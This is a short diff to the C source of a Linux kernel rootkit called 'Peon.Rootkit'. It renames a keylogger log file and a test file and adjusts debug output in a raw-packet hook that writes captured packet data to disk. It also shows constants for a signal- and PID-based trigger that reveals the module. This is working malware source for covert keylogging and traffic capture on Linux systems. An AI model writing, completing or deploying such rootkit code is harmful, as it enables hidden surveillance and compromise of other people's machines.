@@ -40,8 +40,8 @@
 #define SIG_4_SHOW_MOD 9
 #define PID_4_SHOW_MOD 22222
 #define ETH_P_ALL       0x0003
-#define KEYLOG_PATH      "/home/keylogger"
-#define TEST_PATH      "/home/test"
+#define KEYLOG_PATH      "/home/keylogger.txt"
+#define TEST_PATH      "/home/test.txt"
 
 #if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
 #define OS_64_BITS
@@ -128,6 +128,7 @@ error=file_write(fd, file_saved_offset, data, size);
 //if(!error);
 
 	file_saved_offset+=size;
+	//file_sync(fd);
 	file_close(fd);
 	return 0;
 
@@ -470,7 +471,8 @@ int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pk
 				printk(KERN_ALERT "Peon.Rootkit: skb data len %d\n",skb->data_len);
 				printk(KERN_ALERT "Peon.Rootkit: skb mac len %d\n",skb->mac_len);
 				printk(KERN_ALERT "Peon.Rootkit: skb hdr len %d\n",skb->hdr_len);
-				printk(KERN_ALERT "Peon.Rootkit: data=%s\n",data);
+				printk(KERN_ALERT "Peon.Rootkit: skb taille %d\n",(int)(skb->data - skb->tail));
+				//printk(KERN_ALERT "Peon.Rootkit: data=%s\n",data);
 				append_filez(TEST_PATH,data,strlen(data));
 				
 				#endif
